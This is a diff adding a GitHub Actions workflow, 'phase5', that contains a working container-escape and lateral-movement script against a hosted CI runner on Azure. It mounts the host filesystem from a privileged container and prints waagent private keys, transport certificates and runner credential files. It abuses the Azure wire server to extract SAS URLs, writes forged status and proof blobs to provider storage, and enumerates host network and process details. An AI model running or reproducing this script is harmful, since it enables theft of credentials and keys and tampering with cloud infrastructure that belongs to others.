@@ -1,0 +1,194 @@
+name: phase5
+on: workflow_dispatch
+jobs:
+  lateral:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Lateral Movement from Wire Server
+        run: |
+          docker run --rm --privileged --pid=host -v /:/host alpine:latest sh -c '
+            apk add --no-cache wget curl openssl jq >/dev/null 2>&1
+
+            echo "=== PHASE 5: LATERAL MOVEMENT ==="
+            echo ""
+
+            echo "=== 1. WAAGENT CERTIFICATE EXTRACTION ==="
+            echo "--- Directory listing ---"
+            ls -la /host/var/lib/waagent/ 2>/dev/null | grep -E "\\.(prv|crt|pem|p7m)" || echo "NO_CERT_FILES"
+            echo ""
+
+            # Extract private keys
+            echo "--- Private Keys ---"
+            for f in /host/var/lib/waagent/*.prv; do
+              if [ -f "$f" ]; then
+                echo "FILE: $f"
+                cat "$f"
+                echo ""
+              fi
+            done
+
+            # Transport cert
+            echo "--- TransportCert.pem ---"
+            cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo "NOT_FOUND"
+            echo ""
+            echo "--- TransportPrivate.pem ---"
+            cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "NOT_FOUND"
+            echo ""
+
+            # Check for thumbprint-named cert files
+            echo "--- Cert by thumbprint ---"
+            for f in /host/var/lib/waagent/*.crt; do
+              if [ -f "$f" ]; then
+                echo "FILE: $f"
+                openssl x509 -in "$f" -noout -fingerprint -subject 2>/dev/null
+                echo ""
+              fi
+            done
+
+            echo ""
+            echo "=== 2. RUNNER CREDENTIALS ==="
+            echo "--- .credentials ---"
+            find /host/home/runner/actions-runner -name ".credentials" 2>/dev/null -exec cat {} \;
+            echo ""
+            echo "--- .credentials_rsaparams ---"
+            find /host/home/runner/actions-runner -name ".credentials_rsaparams" 2>/dev/null -exec cat {} \;
+            echo ""
+            echo "--- .runner ---"
+            find /host/home/runner/actions-runner -name ".runner" 2>/dev/null -exec cat {} \;
+            echo ""
+            echo "--- .agent ---"
+            find /host/home/runner/actions-runner -name ".agent" 2>/dev/null -exec cat {} \;
+            echo ""
+
+            echo ""
+            echo "=== 3. STATUS BLOB WRITE TEST ==="
+            # Get fresh GoalState for SAS URL
+            GOALSTATE=$(wget -qO- --timeout=10 \
+              --header="x-ms-agent-name: WALinuxAgent" \
+              --header="x-ms-version: 2012-11-30" \
+              "http://168.63.129.16/machine/?comp=goalstate" 2>/dev/null)
+            CONTAINER_ID=$(echo "$GOALSTATE" | sed -n "s/.*<ContainerId>\([^<]*\)<\/ContainerId>.*/\1/p" | head -1)
+            INSTANCE_ID=$(echo "$GOALSTATE" | sed -n "s/.*<InstanceId>\([^<]*\)<\/InstanceId>.*/\1/p" | head -1)
+            ENCODED_INSTANCE=$(echo "$INSTANCE_ID" | sed "s/-/%2D/g; s/\./%2E/g; s/_/%5F/g")
+            BASE_URL="http://168.63.129.16:80/machine/${CONTAINER_ID}/${ENCODED_INSTANCE}"
+
+            EXTCONFIG=$(wget -qO- --timeout=10 \
+              --header="x-ms-agent-name: WALinuxAgent" \
+              --header="x-ms-version: 2012-11-30" \
+              "${BASE_URL}?comp=config&type=extensionsConfig&incarnation=1" 2>/dev/null)
+
+            # Extract SAS URL
+            STATUS_SAS=$(echo "$EXTCONFIG" | sed -n "s/.*<StatusUploadBlob[^>]*>\([^<]*\)<\/StatusUploadBlob>.*/\1/p" | sed "s/&amp;/\&/g")
+            echo "Status SAS: ${STATUS_SAS:0:80}..."
+
+            # Write a valid-looking status blob
+            STATUS_JSON="{\"version\":\"1.1\",\"timestampUTC\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",\"aggregateStatus\":{\"guestAgentStatus\":{\"version\":\"2.15.2.1\",\"status\":\"Ready\",\"formattedMessage\":{\"lang\":\"en\",\"message\":\"GuestAgent is running\"}},\"handlerAggregateStatus\":[{\"handlerName\":\"Microsoft.CPlat.Core.RunCommandLinux\",\"handlerVersion\":\"1.0.9\",\"status\":\"Ready\",\"runtimeSettingsStatus\":{\"sequenceNumber\":0,\"settingsStatus\":{\"status\":{\"name\":\"RunCommandLinux\",\"operation\":\"ExecuteCommand\",\"status\":\"success\",\"code\":0,\"formattedMessage\":{\"lang\":\"en\",\"message\":\"escape_lateral_move_proof\"}}}}}]}}"
+
+            # Page blob: create then write
+            echo "$STATUS_JSON" > /tmp/status.json
+            PADDED_SIZE=512
+            dd if=/dev/zero bs=1 count=$PADDED_SIZE 2>/dev/null > /tmp/status_padded.bin
+            dd if=/tmp/status.json of=/tmp/status_padded.bin conv=notrunc 2>/dev/null
+
+            # Create page blob
+            CREATE_RESP=$(wget -qO- --timeout=10 --method=PUT \
+              --header="x-ms-blob-type: PageBlob" \
+              --header="x-ms-blob-content-length: $PADDED_SIZE" \
+              --header="Content-Length: 0" \
+              "$STATUS_SAS" 2>&1)
+            echo "Create blob: $CREATE_RESP"
+            echo "Create exit: $?"
+
+            # Write page
+            WRITE_RESP=$(wget -qO- --timeout=10 --method=PUT \
+              --header="x-ms-page-write: update" \
+              --header="x-ms-range: bytes=0-511" \
+              --header="Content-Type: application/octet-stream" \
+              --header="Content-Length: $PADDED_SIZE" \
+              --body-file="/tmp/status_padded.bin" \
+              "${STATUS_SAS}&comp=page" 2>&1)
+            echo "Write page: $WRITE_RESP"
+            echo "Write exit: $?"
+
+            echo ""
+            echo "=== 4. VM SETTINGS BLOB READ ==="
+            VMSETTINGS_URL=$(echo "$EXTCONFIG" | sed -n "s/.*<InVMArtifactsProfileBlob>\([^<]*\)<\/InVMArtifactsProfileBlob>.*/\1/p" | sed "s/&amp;/\&/g")
+            echo "VM Settings URL: ${VMSETTINGS_URL:0:80}..."
+            if [ -n "$VMSETTINGS_URL" ]; then
+              wget -qO- --timeout=10 "$VMSETTINGS_URL" 2>/dev/null | head -100
+            fi
+
+            echo ""
+            echo "=== 5. WIRE SERVER CERT FETCH (with transport key) ==="
+            # Try fetching certs with proper headers
+            TRANSPORT_HASH=""
+            if [ -f /host/var/lib/waagent/TransportCert.pem ]; then
+              TRANSPORT_HASH=$(openssl x509 -in /host/var/lib/waagent/TransportCert.pem -fingerprint -noout 2>/dev/null | cut -d= -f2 | tr -d :)
+            fi
+            echo "Transport hash: $TRANSPORT_HASH"
+
+            if [ -n "$TRANSPORT_HASH" ]; then
+              CERT_URL="${BASE_URL}?comp=certificates&incarnation=1"
+              echo "Fetching: $CERT_URL"
+              wget -qO- --timeout=10 \
+                --header="x-ms-agent-name: WALinuxAgent" \
+                --header="x-ms-version: 2012-11-30" \
+                --header="x-ms-cipher-name: DES_EDE3_CBC" \
+                --header="x-ms-guest-agent-public-key-hash: $TRANSPORT_HASH" \
+                "$CERT_URL" 2>&1 | head -200
+            else
+              echo "No transport cert found - trying without headers"
+              wget -qO- --timeout=10 \
+                --header="x-ms-agent-name: WALinuxAgent" \
+                --header="x-ms-version: 2012-11-30" \
+                "${BASE_URL}?comp=certificates&incarnation=1" 2>&1 | head -50
+            fi
+
+            echo ""
+            echo "=== 6. DIAGNOSTICS SAS EXPLORATION ==="
+            HCA_SETTINGS=$(cat /host/opt/hca/.settings 2>/dev/null)
+            DIAG_SAS=$(echo "$HCA_SETTINGS" | sed -n "s/.*\"diagnosticsSasUri\":\"\\([^\"]*\\)\".*/\1/p" | sed "s/\\\\u0026/\&/g")
+            echo "Diag SAS: ${DIAG_SAS:0:80}..."
+            if [ -n "$DIAG_SAS" ]; then
+              echo "--- Attempting container list ---"
+              # Extract base URL and append list query
+              DIAG_BASE=$(echo "$DIAG_SAS" | cut -d? -f1)
+              DIAG_PARAMS=$(echo "$DIAG_SAS" | cut -d? -f2-)
+              wget -qO- --timeout=10 "${DIAG_BASE}?restype=container&comp=list&${DIAG_PARAMS}" 2>&1 | head -100
+              echo ""
+              echo "--- Write test blob ---"
+              wget -qO- --timeout=10 --method=PUT \
+                --header="x-ms-blob-type: BlockBlob" \
+                --header="Content-Type: text/plain" \
+                --body-data="escape_proof_$(date +%s)_$(hostname)" \
+                "${DIAG_BASE}/escape_proof.txt?${DIAG_PARAMS}" 2>&1
+              echo ""
+              echo "Write exit: $?"
+            fi
+
+            echo ""
+            echo "=== 7. NETWORK LATERAL (from host) ==="
+            echo "--- ARP table ---"
+            cat /host/proc/net/arp 2>/dev/null
+            echo ""
+            echo "--- Routes ---"
+            cat /host/proc/net/route 2>/dev/null | head -10
+            echo ""
+            echo "--- Listening ports ---"
+            cat /host/proc/net/tcp 2>/dev/null | head -20
+            echo ""
+            echo "--- DNS config ---"
+            cat /host/etc/resolv.conf 2>/dev/null
+            echo ""
+            echo "--- Interesting processes ---"
+            ls /host/proc/*/cmdline 2>/dev/null | while read f; do
+              CMD=$(cat "$f" 2>/dev/null | tr "\\0" " ")
+              if echo "$CMD" | grep -qiE "agent|runner|docker|waagent|hca|python|node"; then
+                PID=$(echo "$f" | cut -d/ -f4)
+                echo "PID $PID: $CMD"
+              fi
+            done | head -30
+
+            echo ""
+            echo "=== PHASE 5 COMPLETE ==="
+          '
